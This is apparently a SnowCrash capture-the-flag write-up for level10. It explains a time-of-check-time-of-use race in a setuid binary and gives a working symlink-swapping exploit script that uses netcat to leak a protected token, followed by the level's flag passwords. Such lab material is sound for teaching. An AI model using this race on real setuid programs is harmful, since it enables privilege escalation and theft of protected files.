# level10

## Time-of-Check-Time-of-Use exploit

The hints this time around are a binary file and a regular file that we don't have read permissions for.
```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Executing the given binary prints out a help message, and attempting to read from a few files spits back some error messages.
```bash
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to /home/user/level10/token
level10@SnowCrash:~$ ./level10 .bash_logout 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

The tool for this job is `netcat`, which allows us to listen for TCP connections over arbitrary ports.
```bash
level10@SnowCrash:~$ echo hello>/tmp/h
level10@SnowCrash:~$ nc -l 6969&
[1] 18616
level10@SnowCrash:~$ ./level10 /tmp/h 127.0.0.1
Connecting to 127.0.0.1:6969 .. .*( )*.
Connected!
Sending file .. hello
wrote file!
[1]+  Done                    nc -l 6969
```
Now we need to figure out how to bypass the file permissions on `token`.
Disassembling main, there are a few parts that stand out.
```bash
level10@SnowCrash:~$ gdb -batch -ex 'file level10' -ex 'disassemble main'
Dump of assembler code for function main:
   0x080486d4 <+0>:     push   %ebp
   0x080486d5 <+1>:     mov    %esp,%ebp
...
   0x08048749 <+117>:   call   0x80485e0 <access@plt>
...
   0x0804889b <+455>:   call   0x80485a0 <open@plt>
...
End of assembler dump.
```
Most notable is the significant gap between the `access` call to check permissions and the `open` call to actually read the file.

This is a rather simple example of a time-of-check-time-of-use race condition, in which we exploit the overhead of resolving symbolic links in the kernel.

```bash
level10@SnowCrash:~$ cat <<EOF >/tmp/beans
> pkill nc
> rm -f /tmp/flag
> touch /tmp/l /tmp/flag
> while true; do
>     nc -l 6969 > /tmp/flag &
>     ln -sf /tmp/l /tmp/a &
>     ./level10 /tmp/a 127.0.0.1 &
>     ln -sf ~/token /tmp/a &
>     if egrep -q '[a-z0-9]{25}' /tmp/flag; then
>         exit 0
>     fi
> done
> EOF
level10@SnowCrash:~$ sh /tmp/beans
pkill: 12 - Operation not permitted
You don't have access to /tmp/a
You don't have access to /tmp/a
Connecting to 127.0.0.1:6969 .. nc: Connected!
Sending file .. wrote file!
woupa2yuojeeaaed06riuj63c
Connecting to 127.0.0.1:6969 .. Address already in use
nc: Address already in use
Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ cat /tmp/flag
.*( )*.
woupa2yuojeeaaed06riuj63c
```

Time to capture our flag
```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~ $ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~ $ su level11
Password: feulo4b72j7edeahuete3no7c
level11@SnowCrash:~ $ 
```
